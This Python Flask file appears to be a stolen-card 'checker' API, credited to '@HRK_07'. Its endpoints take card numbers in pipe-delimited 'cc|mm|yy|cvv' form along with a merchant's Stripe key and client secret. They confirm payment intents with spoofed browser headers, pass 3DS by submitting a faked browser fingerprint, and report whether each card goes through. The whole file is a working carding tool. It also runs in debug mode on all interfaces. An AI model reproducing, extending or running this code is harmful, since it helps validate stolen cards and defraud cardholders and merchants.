from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Define URLs
PAYMENT_INTENT_URL = "https://api.stripe.com/v1/payment_intents"
THREEDS_AUTHENTICATE_URL = "https://api.stripe.com/v1/3ds2/authenticate"

# Define common headers
COMMON_HEADERS = {
    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    'Accept': "application/json",
    'Content-Type': "application/x-www-form-urlencoded",
    'origin': "https://js.stripe.com",
    'sec-fetch-site': "same-site",
    'sec-fetch-mode': "cors",
    'referer': "https://js.stripe.com/"
}

def confirm_payment_intent_with_payment_method(client_secret, card_details, public_key, stripe_account=None, include_cvc=False):
    try:
        card_info = card_details.split('|')
        card_number = card_info[0]
        exp_month = card_info[1]
        exp_year = card_info[2]
        if include_cvc:
            cvc = card_info[3]
        else:
            cvc = None

        url = f"{PAYMENT_INTENT_URL}/{client_secret.split('_secret_')[0]}/confirm"
        payload = (
            f"payment_method_data%5Btype%5D=card&payment_method_data%5Bcard%5D%5Bnumber%5D={card_number}&"
            f"payment_method_data%5Bcard%5D%5Bexp_year%5D={exp_year}&"
            f"payment_method_data%5Bcard%5D%5Bexp_month%5D={exp_month}&"
            f"payment_method_data%5Bbilling_details%5D%5Baddress%5D%5Bcountry%5D=IN&"
            f"key={public_key}&client_secret={client_secret}"
        )
        if cvc:
            payload += f"&payment_method_data%5Bcard%5D%5Bcvc%5D={cvc}"
        if stripe_account:
            payload += f"&_stripe_account={stripe_account}"

        headers = COMMON_HEADERS

        response = requests.post(url, data=payload, headers=headers)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def authenticate_3ds(source, client_secret, public_key):
    try:
        payload = (
            f"source={source}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3Anull%2C"
            f"%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Atrue%2C"
            f"%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A"
            f"%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A%22360%22%2C%22browserTZ%22%3A"
            f"%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+"
            f"%28KHTML%2C+like+Gecko%29+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support%5Bhosted%5D"
            f"=false&one_click_authn_device_support%5Bsame_origin_frame%5D=false&one_click_authn_device_support%5Bspc_eligible%5D=false"
            f"&one_click_authn_device_support%5Bwebauthn_eligible%5D=false&one_click_authn_device_support%5Bpublickey_credentials_get_allowed%5D"
            f"=true&key={public_key}"
        )
        response = requests.post(THREEDS_AUTHENTICATE_URL, data=payload, headers=COMMON_HEADERS)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def confirm_payment_intent_after_3ds(payment_intent_id, client_secret, public_key, stripe_account=None):
    try:
        url = f"{PAYMENT_INTENT_URL}/{payment_intent_id}"
        params = {
            'key': public_key,
            'client_secret': client_secret
        }
        if stripe_account:
            params['_stripe_account'] = stripe_account

        response = requests.get(url, params=params, headers=COMMON_HEADERS)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def format_response(response):
    try:
        return {
            "api owned by": "@HRK_07",
            "response": response
        }
    except Exception as e:
        return {'error': str(e)}

@app.route('/inbuilt/ccn', methods=['POST'])
def inbuilt_ccn():
    try:
        data = request.get_json()
        public_key = data.get('pk')
        client_secret = data.get('cs')
        card_details = data.get('cc')
        stripe_account = data.get('act')

        first_confirm_response = confirm_payment_intent_with_payment_method(client_secret, card_details, public_key, stripe_account, include_cvc=False)
        if 'error' in first_confirm_response:
            return jsonify(format_response(first_confirm_response)), 400

        if first_confirm_response.get('status') == 'requires_action':
            three_ds_source = first_confirm_response['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            auth_response = authenticate_3ds(three_ds_source, client_secret, public_key)
            if 'error' in auth_response:
                return jsonify(format_response(auth_response)), 400

            if auth_response.get('state') == 'succeeded':
                final_response = confirm_payment_intent_after_3ds(first_confirm_response['id'], client_secret, public_key, stripe_account)
                if 'error' in final_response:
                    return jsonify(format_response(final_response)), 400
            else:
                final_response = auth_response
        else:
            final_response = first_confirm_response

        return jsonify(format_response(final_response))
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/inbuilt/cvv', methods=['POST'])
def inbuilt_cvv():
    try:
        data = request.get_json()
        public_key = data.get('pk')
        client_secret = data.get('cs')
        card_details = data.get('cc')
        stripe_account = data.get('act')

        first_confirm_response = confirm_payment_intent_with_payment_method(client_secret, card_details, public_key, stripe_account, include_cvc=True)
        if 'error' in first_confirm_response:
            return jsonify(format_response(first_confirm_response)), 400

        if first_confirm_response.get('status') == 'requires_action':
            three_ds_source = first_confirm_response['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            auth_response = authenticate_3ds(three_ds_source, client_secret, public_key)
            if 'error' in auth_response:
                return jsonify(format_response(auth_response)), 400

            if auth_response.get('state') == 'succeeded':
                final_response = confirm_payment_intent_after_3ds(first_confirm_response['id'], client_secret, public_key, stripe_account)
                if 'error' in final_response:
                    return jsonify(format_response(final_response)), 400
            else:
                final_response = auth_response
        else:
            final_response = first_confirm_response

        return jsonify(format_response(final_response))
    except Exception as e:
        return jsonify({'error': str(e)}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
  
